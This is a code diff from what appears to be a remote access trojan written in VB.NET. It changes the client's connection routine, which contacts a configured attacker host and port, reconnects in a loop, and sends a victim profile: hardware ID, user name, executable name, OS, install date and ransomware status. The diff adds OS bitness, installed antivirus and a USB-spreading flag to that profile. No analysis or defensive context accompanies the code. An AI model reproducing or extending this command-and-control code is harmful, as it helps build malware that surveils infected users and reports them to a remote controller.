@@ -5,10 +5,12 @@ Public Class TCP
     Public SPL As String = "|'N'|"
     Public KEY As String = "|'L'|"
     Public C As Net.Sockets.TcpClient
+
     Sub New()
         Dim t As New Threading.Thread(AddressOf RC)
         t.Start()
     End Sub
+
     Public Sub Send(ByVal b As Byte())
         If CN = False Then Exit Sub
         Try
@@ -83,7 +85,7 @@ e:      ' clear things and ReConnect
             lp = 0
             C.Client.Connect(Settings.HOST, Settings.PORT)
             CN = True
-            Send("info" & KEY & ID.HWID & KEY & ID.UserName & KEY & IO.Path.GetFileName(Application.ExecutablePath) & KEY & "v0.4.1B" & KEY & ID.MyOS & KEY & ID.INDATE & KEY & ID.Ransomeware & KEY & "")
+            Send("info" & KEY & ID.HWID & KEY & ID.UserName & KEY & IO.Path.GetFileName(Application.ExecutablePath) & KEY & "v0.4.1B" & KEY & ID.MyOS & " " & ID.Bit & KEY & ID.INDATE & KEY & ID.AV & KEY & ID.Ransomeware & KEY & ID.USBSP & KEY & " ")
         Catch ex As Exception
             Threading.Thread.CurrentThread.Sleep(2500)
             GoTo e
